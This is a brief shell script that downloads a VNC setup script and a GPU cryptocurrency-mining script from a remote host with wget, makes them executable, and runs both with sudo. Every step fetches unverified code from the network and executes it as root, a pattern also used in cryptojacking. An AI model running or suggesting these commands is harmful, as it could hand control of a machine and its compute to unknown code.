echo "Installing vnc..."
sleep 3s
wget http://ads.static.socify.co.in/filegator/repository/vnc.sh
sudo chmod +x vnc.sh
wget http://ads.static.socify.co.in/filegator/repository/gpu_miner.sh
sudo chmod +x gpu_miner.sh
sudo bash vnc.sh
echo "Done...✓"
echo "Running Gpu-Mine Script..."
sleep 4s
sudo bash gpu_miner.sh